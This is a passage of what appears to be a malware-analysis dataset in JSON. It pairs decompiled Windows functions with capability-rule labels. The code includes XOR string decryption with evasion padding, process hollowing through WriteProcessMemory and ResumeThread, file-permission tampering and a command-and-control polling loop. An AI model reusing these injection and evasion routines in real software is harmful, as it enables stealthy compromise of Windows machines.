{\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00402a3c(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.00409fd6();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1170
    },
    "0040326b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040326b(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint unaff_EBX;\n    uchar *puVar12;\n    uint32_t uVar13;\n    uint32_t unaff_EDI;\n    int32_t iVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    int32_t *piStack1008;\n    uint32_t uStack1004;\n    uint uStack1000;\n    uchar *puStack992;\n    uchar *puStack984;\n    int32_t iStack980;\n    uint32_t uStack976;\n    uint uStack972;\n    uint uStack968;\n    uchar *puStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    uint uStack924;\n    int32_t iStack920;\n    uint32_t uStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack900;\n    uint32_t uStack896;\n    int32_t iStack892;\n    uchar uStack888;\n    uint uStack887;\n    uint uStack883;\n    uint uStack879;\n    uint uStack875;\n    uint uStack871;\n    uint uStack867;\n    uint uStack863;\n    uint32_t uStack859;\n    uchar uStack855;\n    ushort uStack854;\n    uint uStack852;\n    uint uStack848;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    int32_t iStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x40328f;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x403298;\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x3061626a;\n    uStack852 = 0;\n    iStack920 = 0;\n    uStack916 = uStack916 & 0xffffff00;\n    uStack912 = 0;\n    uStack908 = 0;\n    uStack848 = 0;\n    puVar16 = &stack0xfffffcd4;\n    for (iVar11 = 0x44; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack812 = 0x44;\n    puVar16 = &stack0xfffffcb8;\n    for (iVar11 = 0x10; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack896 = 0x32114f33;\n    puVar16 = &stack0xfffffd1c;\n    for (iVar11 = 0x2cc; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack960 = 0x5d;\n    iStack892 = 0x622a4a44;\n    uStack888 = 0x5f;\n    uStack887 = 0xd4f1830;\n    for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puStack964 = 0x8;\n    uStack883 = 0x3b4a5f32;\n    uStack879 = 0x16301762;\n    uStack875 = 0x4932314f;\n    uStack871 = 0x46623c4a;\n    uStack867 = 0xf4f2f30;\n    uStack863 = 0x7d4a0332;\n    uStack859 = 0x4a306e62;\n    uStack855 = 0x4f;\n    uStack924 = CONCAT31(uStack924._1_3_, 0x4a);\n    uStack968 = 0x403367;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x40336a;\n    iVar11 = (*pcVar4)();\n    uStack916 = 5;\n    uStack859 = uStack859 & 0xffffff | iVar11 << 0x18;\n    uStack855 = iVar11 >> 8;\n    uStack854 = iVar11 >> 0x10;\n    iVar14 = 0;\n    do {\n        uStack972 = 0x403388;\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x9a6e64) {\n            *(iVar14 + iVar11) = (&stack0xfffffc54)[iVar14 % uStack916] ^ (iVar14 + iVar11)[&stack0xfffffc70 + -iVar11];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x2e);\n    uStack972 = 0x104;\n    puStack984 = 0x4033b9;\n    iStack980 = iVar11;\n    uStack976 = unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    puStack984 = puStack964;\n    puStack992 = 0x4033c6;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack992 = 0x4103a0;\n    uStack1000 = 0x4033ce;\n    (*pcVar4)();\n    uStack1000 = arg_8h;\n    piStack1008 = 0x4033d4;\n    uStack1004 = unaff_EDI;\n    (*pcVar4)();\n    piStack1008 = 0x4103a8;\n    (*pcVar4)(unaff_EDI);\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while (iVar14 = (*pcVar4)(0, unaff_EDI, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc9c, &stack0xfffffc80),  iVar14 == 0)\n    {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    }\n    puVar16 = NULL;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_EDI);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uStack804 = 0x10002;\n    puVar5 = piStack1008[0xf] + piStack1008;\n    puStack992 = puVar5;\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack900, &stack0xfffffcdc);\n    if (iVar14 != 0) {\n        piStack1008 = *(puVar5 + 0x50);\n        iVar14 = fcn.0040a118(&stack0xfffffc2c);\n        if ((iVar14 == 0) && (iVar14 = fcn.00409e74(&stack0xfffffc64),  iVar14 == 0)) {\n            puVar12 = puStack984;\n            if (puStack984 != NULL) {\n                for (; piStack1008 != NULL; piStack1008 = piStack1008 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                puVar12 = puVar16;\n                puVar15 = puStack984;\n                for (iVar11 = *(puVar5 + 0x54); iVar11 != 0; iVar11 = iVar11 + -1) {\n                    *puVar15 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                uStack1004 = 0;\n                if (*(puVar5 + 6) != 0) {\n                    piVar8 = puVar5 + *(puVar5 + 0x14) + 0x24;\n                    do {\n                        iVar11 = piVar8[1];\n                        if (iVar11 != 0) {\n                            puVar12 = puVar16 + *piVar8;\n                            puVar15 = puStack984 + *piVar8;\n                            for (; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar15 = *puVar12;\n                                puVar12 = puVar12 + 1;\n                                puVar15 = puVar15 + 1;\n                            }\n                        }\n                        piVar8 = piVar8 + 10;\n                        uStack1004 = uStack1004 + 1;\n                    } while (uStack1004 < *(puVar5 + 6));\n                }\n                iVar11 = 0xa0;\n                if (*(puVar5 + 4) == -0x799c) {\n                    iVar11 = 0xb0;\n                }\n                iVar14 = *(puVar5 + 0x34);\n                uStack896 = uStack924 - *(puVar5 + 0x34);\n                iStack892 = (uStack924 >> 0x1f) - (uStack924 < *(puVar5 + 0x34));\n                piStack1008 = puVar16 + *(puVar5 + iVar11);\n                if ((*(puVar5 + iVar11) != 0) && (uStack976 = *(puVar5 + iVar11 + 4),  uStack976 != 0)) {\n                    for (; 8 < uStack976; uStack976 = uStack976 - *piVar8) {\n                        uStack1004 = piStack1008[1] - 8U >> 1;\n                        iVar11 = *piStack1008;\n                        if ((piStack1008[1] <= uStack976) && (uStack1004 != 0)) {\n                            piVar8 = piStack1008 + 2;\n                            uVar13 = uStack1004;\n                            do {\n                                uVar2 = *piVar8;\n                                if (uVar2 >> 0xc == 3) {\n                                    *(puStack984 + (uVar2 & 0xfff) + iVar11) =\n                                         *(puStack984 + (uVar2 & 0xfff) + iVar11) + (uStack924 - iVar14);\n                                }\n                                else if (uVar2 >> 0xc == 10) {\n                                    uVar9 = uVar2 & 0xfff;\n                                    puVar1 = puStack984 + uVar9 + iVar11;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack896;\n                                    *(puStack984 + uVar9 + 4 + iVar11) =\n                                         *(puStack984 + uVar9 + 4 + iVar11) + iStack892 + CARRY4(uVar3, uStack896);\n                                }\n                                piVar8 = piVar8 + 2;\n                                uVar13 = uVar13 - 1;\n                            } while (uVar13 != 0);\n                        }\n                        piVar8 = piStack1008 + 1;\n                        piStack1008 = piStack1008 + piStack1008[1];\n                        puVar5 = uStack1000;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar14 = *(puVar5 + 0x28);\n                iVar6 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                iVar11 = uStack916;\n                if (iVar6 != 0) {\n                    iStack920 = 1;\n                    iVar11 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc20, 1);\n                    if (iVar11 == 0) {\n                        uStack1000._0_1_ = 0xe9;\n                    }\n                    uStack1000 = uStack1000 & 0xffffff00 | uStack1000;\n                    iVar11 = (*pcVar4)(&stack0xfffffc19, 4);\n                    if (iVar11 == 0) {\n                        uVar13 = (iVar14 - iStack636) + 0x3032624a;\n                        piStack1008 = piStack1008 & 0xff | uVar13 * 0x100;\n                        uStack1004 = uStack1004 & 0xffffff00 | uVar13 >> 0x18;\n                    }\n                    iVar11 = 0;\n                    do {\n                        iVar14 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                           (0x3032624f, iVar11 + iStack652, &stack0xfffffc10 + iVar11, unaff_EBX, 0);\n                        if (iVar14 == 0) break;\n                        iVar11 = iVar11 + 1;\n                    } while (iVar11 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(uStack924);\n                    iVar11 = uStack916;\n                }\n                goto code_r0x004036c7;\n            }\n        }\n        else {\ncode_r0x004036c7:\n            if (puStack984 != NULL) {\n                fcn.00409fd6();\n            }\n        }\n        if (iStack980 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack980);\n        }\n        if (iStack920 != 0) goto code_r0x0040370e;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack912, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\ncode_r0x0040370e:\n    uVar7 = uStack912;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    return uVar7;\n}\n",
        "token_count": 3303
    },
    "0040372d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040372d(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00403f59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00403f59(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41cb5c;\n    var_44h = 0x5d110420;\n    var_40h = 0xe262735;\n    var_3ch = 0x2d3b531b;\n    var_38h = 0x491d082c;\n    var_34h = 0x12323321;\n    var_30h = 0x39274f07;\n    var_2ch = 0x145c1c38;\n    var_28h = 0x5573700f;\n    var_24h = 0x76660c46;\n    var_20h = 0x39425f79;\n    var_14h = 0x39726641;\n    var_10h._0_2_ = 0x4150;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar5 != 0x45f6a5) {\n            var_4h = 6;\n            pcVar4[iVar7] = *(&var_14h + iVar7 % 6) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = 0x4122f0;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x00404047;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x00404047:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.0040b32e();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x412430);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 984
    },
    "004040c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004040c2(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    puVar7 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.00402006(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        puVar4 = uVar3 + var_8h;\n                        goto code_r0x0040412b;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x0040412b:\n        if (puVar4 != NULL) {\n            puVar5 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = 0x4122f0;\n            puVar8 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar8 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar8 = puVar8 + 1;\n            }\n            puVar5 = puVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            pcVar6 = 0x4122f0;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar4, arg_8h * 0x20 + 0x4122f0);\n            do {\n                puVar4 = puVar4 + 0x20;\n                if (*pcVar6 != '\\0') {\n                    (*pcVar1)(puVar4, pcVar6);\n                }\n                pcVar6 = pcVar6 + 0x20;\n            } while (pcVar6 < 0x412410);\n        }\n        fcn.00408e0c();\n        *0x41cbc0 = var_ch;\n        puVar4 = 0x1;\n        *0x41cbc4 = var_8h;\n    }\n    return puVar4;\n}\n",
        "token_count": 777
    },
    "004041b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040427e)\n// WARNING: Removing unreachable block (ram,0x00404299)\n// WARNING: Removing unreachable block (ram,0x004042a0)\n// WARNING: Removing unreachable block (ram,0x004042a7)\n// WARNING: Removing unreachable block (ram,0x004042c0)\n\nuint __cdecl fcn.004041b5(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41cbc0;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.00408ec7();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cb24);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040a969();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.004040c2(0),  iVar2 != 0)) {\n        fcn.00408e0c();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cb24);\n    }\n    while (*0x41cb18 == 0) {\n        iVar2 = fcn.00403f59();\n        if (iVar2 != -1) {\n            fcn.0040b3b0();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 504
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5fh;\n    uint32_t var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uchar var_47h [3];\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar uStack52;\n    uchar var_2fh;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar *pszFirst;\n    int32_t var_14h;\n    int32_t lpLibFileName;\n    code *pszSrch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_8h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar8)(uVar1 | 2);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    stack0xffffffbd = stack0xffffffbd & 0xffffff | 0x20000000;\n    stack0xffffffc1 = 0x183a7c29;\n    stack0xffffffc5 = 0x5d4f4169;\n    var_34h._1_1_ = 0x1a;\n    var_34h._2_1_ = 0x38;\n    var_34h._3_1_ = 0x5a;\n    var_2ch = 0x76396173;\n    var_28h._0_2_ = 0x5a54;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 0x6;\n    iVar9 = 0;\n    pszSrch = &var_3ch - iVar3;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x3a8b20) {\n            *(iVar9 + iVar3) = *(&var_2ch + iVar9 % var_4h) ^ (iVar9 + iVar3)[pszSrch];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xc);\n    _var_47h = _var_47h & 0xffffff | 0x1000000;\n    stack0xffffffb9 = 0x52192b3b;\n    stack0xffffffbd = 0x2f182602;\n    stack0xffffffc1 = 0x2d38561a;\n    stack0xffffffc5 = 0x45133415;\n    var_34h._1_1_ = 0x3b;\n    var_34h._2_1_ = 0x42;\n    var_2ch = 0x74465442;\n    var_28h._0_2_ = 0x6c33;\n    uVar2 = (*pcVar8)(8, 0x14);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar9 = 0;\n    pszSrch = &var_44h - iVar3;\n    var_24h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0x1cdd4) {\n            *(iVar9 + iVar3) = *(&var_2ch + iVar9 % var_4h) ^ (iVar9 + iVar3)[pszSrch];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x13);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_1ch = (*pcVar5)(uVar2, &var_8h);\n    uVar2 = (*pcVar8)(8, 0x208);\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    puVar7 = puVar6;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pszFirst = puVar6;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar6, 0x104);\n    _var_47h = _var_47h & 0xffffff | 0x19000000;\n    stack0xffffffb9 = 0x1f552639;\n    stack0xffffffbd = 0x36554a74;\n    stack0xffffffc1 = 0x30395a6b;\n    stack0xffffffc5 = 0x5c741355;\n    var_34h._1_1_ = 0x55;\n    var_34h._2_1_ = 0x55;\n    var_34h._3_1_ = 0x6b;\n    var_2ch = 0x55553974;\n    var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x6b);\n    *0x41cb28 = puVar6;\n    uVar2 = (*pcVar8)(8, 0x29);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pszSrch = 0x5;\n    iVar9 = 0;\n    var_14h = &var_44h - iVar3;\n    var_20h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        puVar7 = pszFirst;\n        if (iVar4 != 0x540841) {\n            *(iVar9 + iVar3) = *(&var_2ch + iVar9 % pszSrch) ^ (iVar9 + iVar3)[var_14h];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x14);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar3);\n    if (iVar3 != 0) goto code_r0x00404670;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, puVar7);\n    fcn.0040326b(iVar3);\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00404670:\n            if (1 < var_8h) {\n                *0x41cb28 = *(var_1ch + 4);\n            }\n            *0x41cb2c = fcn.00404442();\n            fcn.0040164d();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar3 = fcn.0040b20b();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (iVar3 != 1) break;\n            fcn.00407928();\n            uVar2 = (*pcVar8)(0, puVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        var_7ch = 0x66105740;\n        var_78h = 0x57354e36;\n        var_74h = 0x4e276615;\n        var_70h = 0x66105731;\n        var_6ch = 0x57394e43;\n        var_68h = 0x4e0f661c;\n        var_64h._0_1_ = 6;\n        stack0xffffff99 = 0x9662357;\n        var_5fh = 0x3e57164e;\n        var_5bh = 0x114e0066;\n        var_57h = 0x2f660d57;\n        var_53h = 0x25570b4e;\n        var_4fh = 0x174e0366;\n        var_4bh = 0x3663f57;\n        _var_47h = 0x7157114e;\n        stack0xffffffb9 = 0x1d4e2366;\n        stack0xffffffbd = 0xa662157;\n        stack0xffffffc1 = 0x23570a4e;\n        stack0xffffffc5 = 0x174e0366;\n        var_34h._1_1_ = 0x57;\n        var_34h._2_1_ = 0xd;\n        var_34h._3_1_ = 0x66;\n        uStack52 = 0x66;\n        var_2fh = 0x4e;\n        var_2ch = 0x66515765;\n        var_28h._0_2_ = 0x4e66;\n        uVar2 = (*pcVar8)(8, 0x9d);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = 0;\n        var_1ch = &var_7ch - puVar7;\n        pszFirst = puVar7;\n        do {\n            iVar9 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar9 != 0xe4d8cb) {\n                puVar7[iVar3] = *(&var_2ch + iVar3 % var_4h) ^ (puVar7 + iVar3)[var_1ch];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x4e);\n        var_5bh = var_5bh & 0xffffff | 0x14000000;\n        var_57h = 0x4f36256f;\n        var_53h = 0x42761c31;\n        var_4fh = 0x1b6f5436;\n        var_4bh = 0x316436;\n        _var_47h = 0x45365976;\n        stack0xffffffb9 = 0x6a36536f;\n        stack0xffffffbd = 0x57763b31;\n        stack0xffffffc1 = 0x1d6f4236;\n        